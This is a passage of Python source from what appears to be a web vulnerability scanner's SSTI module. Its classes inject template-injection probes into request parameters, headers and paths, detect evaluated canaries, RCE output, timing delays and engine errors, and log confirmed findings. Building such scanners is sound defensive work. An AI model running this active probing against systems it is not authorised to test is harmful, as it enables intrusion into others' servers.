                    technique=SSTITechnique.BLIND_TIME_BASED,
                    engine=blind["engine"],
                    extra=blind,
                )
            )

        # 7. Error trigger probes
        for err in self.generate_error_trigger_payloads():
            probes.append(
                SSTIProbe(
                    url=target_url,
                    method=method,
                    parameter=parameter,
                    parameter_type=parameter_type,
                    payload=err["payload"],
                    technique=SSTITechnique.ERROR_BASED_FINGERPRINT,
                    engine=err["engine"],
                    extra=err,
                )
            )

        return probes


# =============================================================================
# Security Analyzer
# =============================================================================

class SSTISecurityAnalyzer:
    """
    Analyzes probe responses to detect arithmetic evaluation, RCE execution,
    template engine disambiguation, blind time delays, and error stack traces
    while strictly suppressing false-positive reflections.
    """

    @staticmethod
    def is_static_reflection(response_body: str, payload: str) -> bool:
        """
        Returns True if the raw unrendered payload (or HTML/URL encoded version)
        appears verbatim in the response body without evaluation.
        """
        if not response_body or not payload:
            return False

        # Raw payload reflection
        if payload in response_body:
            return True

        # HTML entity escaped reflection
        html_escaped = (
            payload.replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace('"', "&quot;")
            .replace("'", "&#x27;")
        )
        if html_escaped in response_body:
            return True

        # URL encoded reflection
        url_encoded = urllib.parse.quote(payload)
        if url_encoded in response_body:
            return True

        url_plus = urllib.parse.quote_plus(payload)
        if url_plus in response_body:
            return True

        return False

    @staticmethod
    def strip_payload_reflections(response_body: str, payload: str) -> str:
        """
        Strips verbatim, HTML-escaped, and URL-encoded occurrences of payload
        from response body to isolate evaluated template output.
        """
        if not response_body or not payload:
            return response_body
        cleaned = response_body.replace(payload, "")
        html_escaped = (
            payload.replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace('"', "&quot;")
            .replace("'", "&#x27;")
        )
        cleaned = cleaned.replace(html_escaped, "")
        cleaned = cleaned.replace(urllib.parse.quote(payload), "")
        cleaned = cleaned.replace(urllib.parse.quote_plus(payload), "")
        return cleaned

    @staticmethod
    def analyze_arithmetic_evaluation(
        response_body: str,
        canary_expected: str,
        baseline_body: str = "",
        payload: str = "",
    ) -> Optional[Dict[str, Any]]:
        """
        Verifies that an arithmetic canary evaluated in the template and is present
        in the response body while NOT naturally existing in the baseline response.
        """
        if not response_body or not canary_expected:
            return None

        # Check if expected mathematical result exists in body
        # We use regex word boundaries or token checking to prevent substring false positives
        pattern = re.compile(r"(?<!\d)" + re.escape(canary_expected) + r"(?!\d)")
        match = pattern.search(response_body)
        if not match:
            # Fallback simple substring
            if canary_expected not in response_body:
                return None

        # Check if the same number was already present in baseline body
        if baseline_body:
            baseline_count = len(pattern.findall(baseline_body))
            response_count = len(pattern.findall(response_body))
            if response_count <= baseline_count and canary_expected in baseline_body:
                return None

        # Extract snippet around match
        idx = response_body.find(canary_expected)
        start = max(0, idx - 40)
        end = min(len(response_body), idx + len(canary_expected) + 40)
        snippet = response_body[start:end].strip()

        return {
            "canary": canary_expected,
            "snippet": snippet,
            "confidence": 0.92,
        }

    @staticmethod
    def analyze_rce_execution(response_body: str) -> Optional[Dict[str, Any]]:
        """
        Scans the response body against known command output and process execution signatures.
        """
        if not response_body:
            return None

        for sig_name, pattern in SSTI_RCE_OUTPUT_SIGNATURES.items():
            match = pattern.search(response_body)
            if match:
                snippet = match.group(0)
                return {
                    "signature": sig_name,
                    "matched_text": snippet,
                    "snippet": snippet[:200],
                    "severity": SSTISeverity.CRITICAL,
                    "confidence": 0.98,
                    "cwe_id": "CWE-94",
                    "cvss_score": 9.8,
                }
        return None

    @staticmethod
    def analyze_error_fingerprint(response_body: str) -> Optional[Dict[str, Any]]:
        """
        Matches error stack traces to fingerprint the underlying template engine.
        """
        if not response_body:
            return None

        for engine_key, (engine_name, pattern) in SSTI_ERROR_SIGNATURES.items():
            match = pattern.search(response_body)
            if match:
                snippet = match.group(0)
                return {
                    "engine": engine_name,
                    "signature": engine_key,
                    "snippet": snippet[:200],
                    "severity": SSTISeverity.LOW,
                    "confidence": 0.85,
                    "cwe_id": "CWE-1336",
                    "cvss_score": 5.3,
                }
        return None

    @staticmethod
    def analyze_blind_timing(
        elapsed: float,
        baseline_elapsed: float = 0.0,
        delay_threshold: float = 4.0,
    ) -> bool:
        """
        Asserts that the probe response elapsed time satisfies the timing delay threshold.
        """
        delta = elapsed - baseline_elapsed
        return delta >= delay_threshold and elapsed >= delay_threshold

    def analyze_probe_response(
        self,
        probe: SSTIProbe,
        response: SSTIProbeResponse,
        baseline_body: str = "",
        baseline_elapsed: float = 0.0,
    ) -> Optional[SSTIResult]:
        """
        Performs full security analysis on an executed SSTI probe response.
        """
        body = response.body or ""
        elapsed = response.elapsed

        # Strip payload reflections from response body to isolate evaluated content
        cleaned_body = self.strip_payload_reflections(body, probe.payload)
        cleaned_baseline = self.strip_payload_reflections(baseline_body, probe.payload)

        # 1. Check RCE Execution (highest priority: CRITICAL)
        rce_match = self.analyze_rce_execution(cleaned_body)
        if rce_match:
            return SSTIResult(
                technique=SSTITechnique.SANDBOX_ESCAPE_RCE.value,
                engine=str(probe.engine.value if isinstance(probe.engine, SSTIEngineFamily) else probe.engine),
                payload=probe.payload,
                parameter=probe.parameter,
                parameter_type=probe.parameter_type,
                target_url=probe.url,
                status_code=response.status_code,
                matched_signature=rce_match["signature"],
                evidence_snippet=rce_match["snippet"],
                severity=SSTISeverity.CRITICAL.value,
                confidence=rce_match["confidence"],
                template_id="ssti_rce",
                cwe_id="CWE-94",
                cvss_score=9.8,
                mutation_strategy=str(probe.mutation_strategy.value if isinstance(probe.mutation_strategy, SSTIMutationStrategy) else probe.mutation_strategy) if probe.mutation_strategy else None,
                injected_elapsed=elapsed,
                baseline_elapsed=baseline_elapsed,
            )

        # 2. Check Decision Tree Differential Routing
        if probe.technique == SSTITechnique.DECISION_TREE_ROUTING:
            extra = probe.extra or {}
            # Type coercion check: {{7*'7'}}
            if "rules" in extra:
                rules = extra["rules"]
                for expected_str, detected_engine in rules.items():
                    if expected_str in cleaned_body and expected_str not in cleaned_baseline:
                        eng_name = detected_engine.value if isinstance(detected_engine, SSTIEngineFamily) else detected_engine
                        return SSTIResult(
                            technique=SSTITechnique.DECISION_TREE_ROUTING.value,
                            engine=str(eng_name),
                            payload=probe.payload,
                            parameter=probe.parameter,
                            parameter_type=probe.parameter_type,
                            target_url=probe.url,
                            status_code=response.status_code,
                            matched_signature=f"differential_match:{expected_str}",
                            evidence_snippet=f"Engine disambiguation resolved to {eng_name} via output '{expected_str}'",
                            severity=SSTISeverity.HIGH.value,
                            confidence=0.95,
                            template_id="ssti",
                            cwe_id="CWE-1336",
                            cvss_score=8.2,
                            expected_canary=expected_str,
                            injected_elapsed=elapsed,
                            baseline_elapsed=baseline_elapsed,
                        )
            elif "expected_signature" in extra:
                sig_pat = re.compile(extra["expected_signature"], re.IGNORECASE)
                if sig_pat.search(cleaned_body) and not sig_pat.search(cleaned_baseline):
                    eng_name = probe.engine.value if isinstance(probe.engine, SSTIEngineFamily) else probe.engine
                    return SSTIResult(
                        technique=SSTITechnique.DECISION_TREE_ROUTING.value,
                        engine=str(eng_name),
                        payload=probe.payload,
                        parameter=probe.parameter,
                        parameter_type=probe.parameter_type,
                        target_url=probe.url,
                        status_code=response.status_code,
                        matched_signature=extra.get("discriminator", "decision_tree"),
                        evidence_snippet=f"Disambiguation matched signature for {eng_name}",
                        severity=SSTISeverity.HIGH.value,
                        confidence=0.90,
                        template_id="ssti",
                        cwe_id="CWE-1336",
                        cvss_score=8.2,
                        injected_elapsed=elapsed,
                        baseline_elapsed=baseline_elapsed,
                    )
            elif "expected_canary" in extra:
                canary = extra["expected_canary"]
                if canary in cleaned_body and canary not in cleaned_baseline:
                    eng_name = probe.engine.value if isinstance(probe.engine, SSTIEngineFamily) else probe.engine
                    return SSTIResult(
                        technique=SSTITechnique.DECISION_TREE_ROUTING.value,
                        engine=str(eng_name),
                        payload=probe.payload,
                        parameter=probe.parameter,
                        parameter_type=probe.parameter_type,
                        target_url=probe.url,
                        status_code=response.status_code,
                        matched_signature=extra.get("discriminator", "decision_tree"),
                        evidence_snippet=f"Disambiguation confirmed {eng_name} with canary '{canary}'",
                        severity=SSTISeverity.HIGH.value,
                        confidence=0.90,
                        template_id="ssti",
                        cwe_id="CWE-1336",
                        cvss_score=8.2,
                        injected_elapsed=elapsed,
                        baseline_elapsed=baseline_elapsed,
                    )


        # 3. Check Arithmetic Expression Canary Evaluation
        if probe.expected_canary:
            arith_eval = self.analyze_arithmetic_evaluation(
                cleaned_body,
                probe.expected_canary,
                baseline_body=cleaned_baseline,
                payload=probe.payload,
            )
            if arith_eval:
                eng_name = probe.engine.value if isinstance(probe.engine, SSTIEngineFamily) else probe.engine
                return SSTIResult(
                    technique=SSTITechnique.ARITHMETIC_PROBE.value,
                    engine=str(eng_name),
                    payload=probe.payload,
                    parameter=probe.parameter,
                    parameter_type=probe.parameter_type,
                    target_url=probe.url,
                    status_code=response.status_code,
                    matched_signature=f"canary_evaluation:{probe.expected_canary}",
                    evidence_snippet=arith_eval["snippet"],
                    severity=SSTISeverity.HIGH.value,
                    confidence=arith_eval["confidence"],
                    template_id="ssti",
                    cwe_id="CWE-1336",
                    cvss_score=8.2,
                    mutation_strategy=str(probe.mutation_strategy.value if isinstance(probe.mutation_strategy, SSTIMutationStrategy) else probe.mutation_strategy) if probe.mutation_strategy else None,
                    expected_canary=probe.expected_canary,
                    injected_elapsed=elapsed,
                    baseline_elapsed=baseline_elapsed,
                )

        # 4. Check Blind Time-Based Latency Delay
        if probe.technique == SSTITechnique.BLIND_TIME_BASED:
            threshold = float(probe.extra.get("delay_seconds", 4.0)) if probe.extra else 4.0
            if self.analyze_blind_timing(elapsed, baseline_elapsed, delay_threshold=threshold - 0.5):
                eng_name = probe.engine.value if isinstance(probe.engine, SSTIEngineFamily) else probe.engine
                delta = elapsed - baseline_elapsed
                return SSTIResult(
                    technique=SSTITechnique.BLIND_TIME_BASED.value,
                    engine=str(eng_name),
                    payload=probe.payload,
                    parameter=probe.parameter,
                    parameter_type=probe.parameter_type,
                    target_url=probe.url,
                    status_code=response.status_code,
                    matched_signature=f"blind_time_delay:{delta:.2f}s",
                    evidence_snippet=f"Time delay probe induced {delta:.2f}s latency delta (elapsed={elapsed:.2f}s vs baseline={baseline_elapsed:.2f}s)",
                    severity=SSTISeverity.HIGH.value,
                    confidence=0.90,
                    template_id="ssti_blind",
                    cwe_id="CWE-1336",
                    cvss_score=8.5,
                    delay_delta=delta,
                    injected_elapsed=elapsed,
                    baseline_elapsed=baseline_elapsed,
                )

        # 5. Check Error-Based Engine Fingerprinting
        err_match = self.analyze_error_fingerprint(cleaned_body)
        if err_match:
            return SSTIResult(
                technique=SSTITechnique.ERROR_BASED_FINGERPRINT.value,
                engine=err_match["engine"],
                payload=probe.payload,
                parameter=probe.parameter,
                parameter_type=probe.parameter_type,
                target_url=probe.url,
                status_code=response.status_code,
                matched_signature=err_match["signature"],
                evidence_snippet=err_match["snippet"],
                severity=err_match["severity"].value if isinstance(err_match["severity"], SSTISeverity) else err_match["severity"],
                confidence=err_match["confidence"],
                template_id="ssti_error",
                cwe_id=err_match["cwe_id"],
                cvss_score=err_match["cvss_score"],
                injected_elapsed=elapsed,
                baseline_elapsed=baseline_elapsed,
            )

        return None



# =============================================================================
# SSTI Prober (HTTP Dispatcher)
# =============================================================================

class SSTIProber:
    """
    Executes SSTI probes across GET query parameters, POST form & JSON bodies,
    path segments, and HTTP request headers.
    """

    def __init__(self, http_client: Optional[Any] = None) -> None:
        self.http_client = http_client

    def measure_baseline(
        self,
        url: str,
        method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
    ) -> SSTIProbeResponse:
        """
        Takes a baseline measurement of the target endpoint prior to injection.
        """
        probe = SSTIProbe(url=url, method=method, headers=headers or {})
        return self.execute_probe(probe)

    def execute_probe(self, probe: SSTIProbe) -> SSTIProbeResponse:
        """
        Dispatches an HTTP request with the probe injected into the designated parameter location.
        """
        if self.http_client is None:
            return SSTIProbeResponse(probe=probe, status_code=200, body="", elapsed=0.05)

        target_url = probe.url
        method = probe.method.upper()
        req_headers = dict(probe.headers)
        data = copy.deepcopy(probe.data) if probe.data is not None else None
        json_body = copy.deepcopy(probe.json_body) if probe.json_body is not None else None

        # Inject payload based on parameter type
        if probe.parameter_type == "query":
            parsed = urllib.parse.urlparse(target_url)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            param_key = probe.parameter or "q"
            qs[param_key] = [probe.payload]
            new_query = urllib.parse.urlencode(qs, doseq=True)
            target_url = urllib.parse.urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment,
            ))

        elif probe.parameter_type == "body":
            if data is None:
                data = {}
            param_key = probe.parameter or "template"
            data[param_key] = probe.payload
            req_headers.setdefault("Content-Type", "application/x-www-form-urlencoded")

        elif probe.parameter_type == "json":
            param_key = probe.parameter or "template"
            if json_body is None:
                json_body = {}
            if isinstance(json_body, dict):
                json_body[param_key] = probe.payload
            req_headers.setdefault("Content-Type", "application/json")

        elif probe.parameter_type == "header":
            header_key = probe.parameter or "X-Template"
            req_headers[header_key] = probe.payload

        elif probe.parameter_type == "path":
            parsed = urllib.parse.urlparse(target_url)
            parts = parsed.path.strip("/").split("/")
            if parts and parts[-1]:
                parts[-1] = urllib.parse.quote(probe.payload, safe="")
            else:
                parts = [urllib.parse.quote(probe.payload, safe="")]
            new_path = "/" + "/".join(parts)
            target_url = urllib.parse.urlunparse((
                parsed.scheme,
                parsed.netloc,
                new_path,
                parsed.params,
                parsed.query,
                parsed.fragment,
            ))

        start_time = time.time()
        try:
            if method == "POST":
                # Handle json vs data
                if json_body is not None:
                    resp = self.http_client.post(
                        target_url,
                        json=json_body,
                        headers=req_headers,
                        timeout=probe.timeout,
                    )
                else:
                    resp = self.http_client.post(
                        target_url,
                        data=data,
                        headers=req_headers,
                        timeout=probe.timeout,
                    )
            else:
                resp = self.http_client.get(
                    target_url,
                    headers=req_headers,
                    timeout=probe.timeout,
                )
            calc_elapsed = time.time() - start_time
            resp_elapsed = getattr(resp, "elapsed", None)
            if resp_elapsed is not None and isinstance(resp_elapsed, (int, float)) and resp_elapsed > 0:
                elapsed = float(resp_elapsed)
            else:
                elapsed = calc_elapsed

            body_content = getattr(resp, "body", "") or getattr(resp, "raw_body", "") or getattr(resp, "text", "") or ""
            status_code = getattr(resp, "status_code", 200)
            headers_dict = dict(getattr(resp, "headers", {}))
            success = bool(getattr(resp, "success", 200 <= status_code < 400))

            return SSTIProbeResponse(
                probe=probe,
                status_code=status_code,
                body=str(body_content),
                headers=headers_dict,
                elapsed=elapsed,
                success=success,
                raw_response=resp,
            )

        except Exception as e:
            logger.debug("SSTI probe execution failed against %s: %s", target_url, e)
            calc_elapsed = time.time() - start_time
            return SSTIProbeResponse(
                probe=probe,
                status_code=500,
                body="",
                elapsed=calc_elapsed,
                success=False,
            )


# =============================================================================
# SSTI Collector (BaseCollector Implementation)
# =============================================================================

class SSTICollector(BaseCollector):
    """
    Active Collector for discovering and verifying Server-Side Template Injection (SSTI)
    across web endpoints using AuthenticatedHttpClient.
    """

    def __init__(
        self,
        http_client: Optional[Any] = None,
        generator: Optional[SSTIPayloadGenerator] = None,
        analyzer: Optional[SSTISecurityAnalyzer] = None,
        prober: Optional[SSTIProber] = None,
        max_candidates: int = 25,
    ) -> None:
        self.http_client = http_client
        self.generator = generator or SSTIPayloadGenerator()
        self.analyzer = analyzer or SSTISecurityAnalyzer()
        self.prober = prober or SSTIProber(http_client=self.http_client)
        self.max_candidates = max_candidates
        self.results: List[SSTIResult] = []

    def _discover_candidate_endpoints(self, mission: Any) -> List[str]:
        """
        Discovers candidate endpoints from mission endpoints, live hosts, target,
        and common template rendering paths.
        """
        candidates: Set[str] = set()
        raw_mission = getattr(mission, "_raw_mission", getattr(mission, "_mission", mission))

        # 1. Mission endpoints
        endpoints = getattr(raw_mission, "endpoints", []) or []
        for ep in endpoints:
            if isinstance(ep, str):
                candidates.add(ep)
            elif hasattr(ep, "url"):
                candidates.add(ep.url)
            elif isinstance(ep, dict) and "url" in ep:
                candidates.add(ep["url"])

        # 2. Live hosts & target fallback paths
        live_hosts = getattr(raw_mission, "live_hosts", []) or []
        target = getattr(raw_mission, "target", None)
        base_urls: Set[str] = set()

        for lh in live_hosts:
            if isinstance(lh, str):
                base_urls.add(lh)
            elif hasattr(lh, "url"):
                base_urls.add(lh.url)
            elif isinstance(lh, dict) and "url" in lh:
                base_urls.add(lh["url"])

        if target and isinstance(target, str):
            base_urls.add(target)

        template_probe_paths = [
            "/template",
            "/render",
            "/preview",
            "/email/preview",
            "/pdf/generate",
            "/profile/card",
            "/view",
            "/greeting",
            "/hello",
        ]

        for base in base_urls:
            parsed = urllib.parse.urlparse(base)
            root = f"{parsed.scheme}://{parsed.netloc}" if parsed.netloc else base
            for path in template_probe_paths:
                candidates.add(urllib.parse.urljoin(root, path))

        return list(candidates)[: self.max_candidates]

    def _extract_injection_points(self, url: str) -> List[Tuple[str, str]]:
        """
        Extracts candidate injection parameters: (parameter_name, parameter_type).
        """
        points: List[Tuple[str, str]] = []
        parsed = urllib.parse.urlparse(url)

        # GET query parameters
        if parsed.query:
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            for param in qs.keys():
                points.append((param, "query"))

        # Common template parameter defaults if no query params
        if not points:
            for p in ("template", "name", "q", "content", "msg", "view", "page", "preview"):
                points.append((p, "query"))

        # Always add body / json candidate
        points.append(("template", "body"))
        points.append(("content", "json"))

        return points

    def _publish_finding(
        self,
        mission: Any,
        result: SSTIResult,
        base_url: str,
        target_url: str,
    ) -> Evidence:
        """
        Executes Quadruple State Publishing:
        1. raw_mission.evidence.add(ev)
        2. raw_mission.vulnerabilities.append({...})
        3. raw_mission.attack_surface_graph (Nodes & Edges)
        4. ControlledMission.publish_finding(ev_id, ev)
        """
        raw_mission = getattr(mission, "_raw_mission", getattr(mission, "_mission", mission))
        parsed = urllib.parse.urlparse(target_url)
        url_path = parsed.path or "/"

        title = f"Server-Side Template Injection ({result.engine.title()}) in {result.parameter or 'endpoint'}"
        description = (
            f"Server-Side Template Injection ({result.engine}) verified at {target_url} via {result.technique}. "
            f"Payload '{result.payload}' evaluated successfully. "
            f"Evidence: {result.evidence_snippet}"
        )

        ev = Evidence(
            category="ssti",
            value=f"ssti:{target_url}:{result.parameter}:{result.technique}",
            source="ssti",
            status="CONFIRMED",
            confidence=result.confidence,
            title=title,
            description=description,
            severity=result.severity,
            provenance=ProvenanceData(
                observation_id="SSTICollector",
                step_id="ssti_collector",
            ),
            tags=["ssti", "template_injection", result.engine, result.technique],
            metadata={
                "url": target_url,
                "host": base_url,
                "path": url_path,
                "category": "ssti",
                "severity": result.severity,
                "confidence": result.confidence,
                "vulnerability_type": "ssti",
                "technique": result.technique,
                "engine": result.engine,
                "strategy": result.mutation_strategy,
                "mutation_strategy": result.mutation_strategy,
                "matched_signature": result.matched_signature,
                "template_id": result.template_id,
                "status_code": result.status_code,
                "evidence_snippet": result.evidence_snippet[:250],
                "payload": str(result.payload)[:300],
                "parameter": result.parameter or "template",
                "parameter_type": result.parameter_type,
                "cwe_id": result.cwe_id,
                "cvss_score": result.cvss_score,
                "delay_delta": result.delay_delta,
                "expected_canary": result.expected_canary,
            },
        )

        # 1. Update raw_mission.evidence
        if hasattr(raw_mission, "evidence") and raw_mission.evidence is not None:
            if hasattr(raw_mission.evidence, "add"):
                raw_mission.evidence.add(ev)
            elif isinstance(raw_mission.evidence, list):
                raw_mission.evidence.append(ev)

        # 2. Update raw_mission.vulnerabilities
        if hasattr(raw_mission, "vulnerabilities") and isinstance(raw_mission.vulnerabilities, list):
            raw_mission.vulnerabilities.append({
                "name": title,
                "template_id": result.template_id,
                "severity": result.severity,
                "host": base_url,
                "url": target_url,
                "description": description,
                "technique": result.technique,
                "engine": result.engine,
                "parameter": result.parameter,
                "strategy": result.mutation_strategy,
                "cwe_id": result.cwe_id,
                "cvss_score": result.cvss_score,
            })

        # 3. AttackSurfaceGraph Node & Edge Expansion
        graph = getattr(raw_mission, "attack_surface_graph", None) or getattr(raw_mission, "graph", None)
        if graph is not None and hasattr(graph, "add") and hasattr(graph, "connect"):
            lh_id = f"live_host:{base_url}"
            ep_id = f"endpoint:{target_url}"
            vuln_id = f"vulnerability:{result.template_id}:{target_url}:{result.parameter or result.technique}"

            graph.add(Node(id=lh_id, type="live_host", value=base_url, metadata={"url": base_url}))
            graph.add(Node(id=ep_id, type="endpoint", value=target_url, metadata={"url": target_url, "status_code": result.status_code}))
            graph.add(Node(id=vuln_id, type="vulnerability", value=title, metadata=ev.metadata))

            graph.connect(lh_id, ep_id, edge_type="HAS_ENDPOINT")
            graph.connect(lh_id, vuln_id, edge_type="HAS_VULNERABILITY")
            graph.connect(ep_id, vuln_id, edge_type="HAS_VULNERABILITY")

        # 4. ControlledMission wrapper publish
        if mission is not raw_mission and hasattr(mission, "publish_finding"):
            try:
                mission.publish_finding(ev.evidence_id, ev)
            except Exception:
                pass

        return ev

    def collect(self, mission: Any) -> List[Evidence]:
        """
        Executes active SSTI probes across candidate endpoints and injection points.
        """
        discovered_candidates = self._discover_candidate_endpoints(mission)
        evidence_list: List[Evidence] = []
        raw_mission = getattr(mission, "_raw_mission", getattr(mission, "_mission", mission))

        # Ensure prober has http_client
        if self.prober.http_client is None and self.http_client is not None:
            self.prober.http_client = self.http_client

        for target_url in discovered_candidates:
            parsed = urllib.parse.urlparse(target_url)
            base_url = f"{parsed.scheme}://{parsed.netloc}" if parsed.netloc else target_url

            # Measure baseline response
            baseline_resp = self.prober.measure_baseline(target_url)
            baseline_body = baseline_resp.body
            baseline_elapsed = baseline_resp.elapsed

            injection_points = self._extract_injection_points(target_url)

            endpoint_vulnerable = False
            for param, ptype in injection_points:
                if endpoint_vulnerable:
                    break

                probes = self.generator.build_all_probes(
                    target_url=target_url,
                    parameter=param,
                    parameter_type=ptype,
                )

                for probe in probes:
                    resp = self.prober.execute_probe(probe)
                    res = self.analyzer.analyze_probe_response(
                        probe=probe,
                        response=resp,
                        baseline_body=baseline_body,
                        baseline_elapsed=baseline_elapsed,
                    )

                    if res is not None:
                        self.results.append(res)
                        ev = self._publish_finding(mission, res, base_url, target_url)
                        evidence_list.append(ev)
                        endpoint_vulnerable = True
                        break

        return evidence_list

    # Pipeline runner compatibility alias
    execute = collect


# Backwards compatibility alias
ServerSideTemplateInjectionCollector = SSTICollector
